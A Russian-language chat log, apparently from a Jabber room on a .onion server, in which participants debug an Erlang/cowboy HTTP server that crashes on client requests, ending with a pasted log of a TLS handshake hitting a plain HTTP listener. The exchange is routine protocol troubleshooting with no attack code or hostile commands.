Timestamp	From	To	Message
2021-08-27 10:23:54.836176	ttrr	defender	тута
2021-08-27 10:24:08.860095	defender	ttrr	ждем остальных
2021-08-27 10:24:08.862831	ttrr	defender	ждем остальных
2021-08-27 10:24:39.448525	ttrr	defender	ок
2021-08-27 10:26:04.832095	ttrr	defender	хай
2021-08-27 10:26:17.237221	ttrr	defender	я пароль не ставил на вход в конфу, это приемлемо?
2021-08-27 10:27:43.436076	defender	ttrr	это только для зарегистрированных участников
2021-08-27 10:27:43.437167	ttrr	defender	это только для зарегистрированных участников
2021-08-27 10:27:48.739755	defender	ttrr	других тут не может быть
2021-08-27 10:27:48.740596	ttrr	defender	других тут не может быть
2021-08-27 10:28:03.701637	defender	ttrr	хоф остался
2021-08-27 10:28:03.703264	ttrr	defender	хоф остался
2021-08-27 10:28:46.325657	ttrr	defender	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:29:26.309128	ttrr	defender	тута
2021-08-27 10:29:26.310436	ttrr	defender	ждем остальных
2021-08-27 10:29:26.311506	ttrr	defender	ок
2021-08-27 10:29:26.312274	ttrr	defender	хай
2021-08-27 10:29:26.313360	ttrr	defender	я пароль не ставил на вход в конфу, это приемлемо?
2021-08-27 10:29:26.314409	ttrr	defender	это только для зарегистрированных участников
2021-08-27 10:29:26.315033	ttrr	defender	других тут не может быть
2021-08-27 10:29:26.316260	ttrr	defender	хоф остался
2021-08-27 10:29:40.192155	ttrr	defender	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:30:23.084784	ttrr	defender	на месте
2021-08-27 10:30:28.883058	ttrr	defender	привет
2021-08-27 10:34:32.661666	ttrr	defender	короче . проблема в хттп в том . что клиент обрывает коннект раньше, чем передает данные . а именно я грешу на то, что клиент не передает самый последний перевод строки
2021-08-27 10:35:13.159964	ttrr	defender	от этого возникает краш на моей стороне и я не могу обработать запрос
2021-08-27 10:35:33.427548	ttrr	defender	в http есть три способа получить флаг конца передачи
2021-08-27 10:35:41.725856	ttrr	defender	1. Content-Length
2021-08-27 10:35:47.130499	ttrr	defender	2. Connection: close
2021-08-27 10:36:04.114041	ttrr	defender	3. Content-Encoding: chunked и дальше отслеживается цепочка чанков
2021-08-27 10:36:15.504833	ttrr	defender	клиент о котором ты говоришь какой метод использует?
2021-08-27 10:36:21.263922	ttrr	defender	ты сам какой метод форсируешь на сервере?
2021-08-27 10:36:59.318521	ttrr	defender	defender добавь сюда flip и steller
2021-08-27 10:37:09.756334	ttrr	defender	да  я никакой не форсирую .есть либа . которая занимается хтпп .. она парсит и разбирает всё .. я лишь её вызываю . 
причем сделано это так .. что сначала работает она .. а потом уже я .. т.о. я не имею доступа напрямую к бинарному потоку данных
2021-08-27 10:37:22.168532	ttrr	defender	так вот разберись
2021-08-27 10:37:36.835609	ttrr	defender	у клиентов есть причина использовать наиболее простой метод
2021-08-27 10:37:55.060324	ttrr	defender	причина есть .если эта причина удовлетворяет спеицификациям хттп ..
2021-08-27 10:37:55.376350	ttrr	defender	например им сложно использовать chunked-передачу
2021-08-27 10:38:34.865263	ttrr	defender	и они скорее всего используют connection: close, то есть сигнал о конце передачи приходит с закрытием сокета
2021-08-27 10:38:38.660530	ttrr	defender	если либа падает - это значит что клиент отправляет не то что ожидает эта либа . т.е. не хттп
2021-08-27 10:39:02.448168	ttrr	defender	ты должен дать требования тем кто пишет клиенты, что эта либа умеет, а чего не умеет
2021-08-27 10:39:06.112144	ttrr	defender	либа ожидает на входе (бинарном) данные, но бинарный вход пуст .. вот парсер хттп и ломается
2021-08-27 10:39:17.549803	ttrr	defender	она умеет всё
2021-08-27 10:39:26.513704	ttrr	defender	как видим не всё
2021-08-27 10:39:29.431661	ttrr	defender	это промышленное решение .. и её пользуются очень многие
2021-08-27 10:39:40.115299	ttrr	defender	давай на примерах
2021-08-27 10:39:46.363942	ttrr	defender	примерах что ?
2021-08-27 10:39:51.188584	ttrr	defender	кривой посылки
2021-08-27 10:40:03.664725	ttrr	defender	выложи сюда кривую посылку со стороны модуля и скажи что в ней криво
2021-08-27 10:40:15.077360	ttrr	defender	еще раз . у меня нет доступа к бинарному потоку ..
2021-08-27 10:40:19.330216	ttrr	defender	либа от меня это скрывает
2021-08-27 10:40:31.498218	ttrr	defender	ну HTTP-запрос ты же можешь перехватить?
2021-08-27 10:40:39.254660	ttrr	defender	я лишь могу по ошибке сказать где сломалось у неё и я вижу что она ожидает данные - но данных нет
2021-08-27 10:40:52.887542	ttrr	defender	то есть ты даже не видишь сырые HTTP
2021-08-27 10:40:58.708640	ttrr	defender	нет
2021-08-27 10:41:03.475858	ttrr	defender	только через прокси какой могу
2021-08-27 10:41:07.273282	ttrr	defender	поставь mitmproxy
2021-08-27 10:41:18.240197	ttrr	defender	как можно отлаживать такую сложную систему наощупь?
2021-08-27 10:41:18.449586	ttrr	defender	ну или логи сделать внутри либы
2021-08-27 10:41:22.815803	ttrr	defender	это уже по живому надо
2021-08-27 10:41:51.572102	ttrr	defender	и флип и стеллер могут предъявить запросы HTTP которые они генерируют, и могут попытаться их исправить в соответствии с твоими указаниями
2021-08-27 10:42:05.074755	ttrr	defender	в общем давай я посмотрю тогда бинарный поток . лог сделаю на живом сервере ..
2021-08-27 10:42:05.582978	ttrr	defender	тебе лишь надо сказать где ошибка, по твоей версии
2021-08-27 10:42:08.863047	ttrr	defender	может убрать либу? получать данные с сокета?
2021-08-27 10:42:10.026029	ttrr	defender	они тоже могут дать пример потока
2021-08-27 10:42:18.327826	ttrr	defender	парсить хттп сам будешь ?
2021-08-27 10:42:39.088171	ttrr	defender	@zulas так тут же важно именно сравнить то, что они отправляют, с тем, что ты принимаешь
2021-08-27 10:42:43.638223	ttrr	defender	мне щас надо на часок отлучится .. приду - сделаю - посмотрю
2021-08-27 10:42:44.194136	ttrr	defender	очень далеко не факт что это одно и то же
2021-08-27 10:42:44.437525	ttrr	defender	ну а какой выход?
2021-08-27 10:42:52.130379	ttrr	defender	уже не раз так было
2021-08-27 10:42:54.115412	ttrr	defender	выход - разбираться
2021-08-27 10:42:55.651006	ttrr	defender	по пути у нас прокладки
2021-08-27 10:42:59.528754	ttrr	defender	и наши, и чужие
2021-08-27 10:43:06.784530	ttrr	defender	они жонглируют заголовками
2021-08-27 10:43:16.180122	ttrr	defender	они имеют право перекодировать пакеты
2021-08-27 10:43:18.435811	ttrr	defender	отошел
2021-08-27 12:29:10.137079	ttrr	defender	я на живом сейчас экспериментирую
2021-08-27 12:49:43.335545	ttrr	defender	2021-08-27 15:43:18.250 [info] <0.173.0> Data: <<22,3,1,0,122,1,0,0,118,3,1,97,40,221,230,188,215,55,88,76,161,53,70,161,100,228,44,187,170,189,227,118,111,91,127,244,240,143,161,47,114,14,107,0,0,14,192,10,192,9,192,20,192,19,0,53,0,47,0,10,1,0,0,63,0,0,0,28,0,26,0,0,23,116,114,97,99,107,46,97,110,97,108,121,116,105,99,115,45,100,97,116,97,46,105,111,0,10,0,8,0,6,0,29,0,23,0,24,0,11,0,2,1,0,0,35,0,0,0,23,0,0,255,1,0,1,0>> 
2021-08-27 15:43:18.251 [error] emulator Error in process <0.173.0> on node dero_server@server with exit value:
2021-08-27 15:43:18.251 [error] <0.173.0>@cowboy_protocol:parse_method:169 Ranch listener http terminated with reason: no function clause matching cowboy_protocol:parse_method(<<>>, {state,#Port<0.4001>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[...]}],...}, <<22,3,1,0,122,1,0,0,118,3,1,97,40,221,230,188,215,55,88,76,161,53,70,161,100,228,44,187,170,189,...>>) line 169

вот из лога бинарный поток
2021-08-27 12:49:51.523911	ttrr	defender	который вызывает проблему
2021-08-27 12:50:38.326893	ttrr	defender	а вот это:

